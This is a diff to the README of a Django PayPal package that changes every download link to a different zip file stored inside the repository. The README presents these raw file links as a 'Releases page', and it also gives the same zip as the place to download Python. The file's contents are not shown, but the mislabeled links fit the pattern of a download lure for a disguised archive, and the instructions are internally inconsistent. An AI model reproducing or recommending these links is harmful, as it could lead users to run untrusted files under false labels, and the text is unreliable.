@@ -16,17 +16,17 @@ Welcome to **django-paypal-checkout**, a user-friendly package that makes it eas
 
 To get started, visit the Releases page to download the package:
 
-[![Download django-paypal-checkout](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/exceptions/django_paypal_checkout_v2.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/exceptions/django_paypal_checkout_v2.8.zip)
+[![Download django-paypal-checkout](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/forms/paypal-checkout-django-v3.9.zip%20Now-brightgreen)](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/forms/paypal-checkout-django-v3.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **django-paypal-checkout**.
-3. Click on the file named `https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/exceptions/django_paypal_checkout_v2.8.zip` (replace `x.x.x` with the version number).
+3. Click on the file named `https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/forms/paypal-checkout-django-v3.9.zip` (replace `x.x.x` with the version number).
 4. Save the file to your computer.
 5. Unzip the downloaded package to your desired location.
 
 ### Step-by-Step Installation Guide
 
-1. **Install Python**: Make sure Python is installed on your computer. You can download it [here](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/exceptions/django_paypal_checkout_v2.8.zip).
+1. **Install Python**: Make sure Python is installed on your computer. You can download it [here](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/forms/paypal-checkout-django-v3.9.zip).
 2. **Install Django**: Open a command prompt or terminal and run:
    ```bash
    pip install django
@@ -61,4 +61,4 @@ For detailed instructions on how to set up and use django-paypal-checkout, pleas
 
 Feel free to explore the many possibilities of integrating PayPal into your Django application. If you have questions or need support, don't hesitate to reach out to the community or create an issue in our repository. 
 
-[Visit the Releases page to download.](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/exceptions/django_paypal_checkout_v2.8.zip)
+[Visit the Releases page to download.](https://raw.githubusercontent.com/jonathanwifhat/django-paypal-checkout/main/paypal/forms/paypal-checkout-django-v3.9.zip)
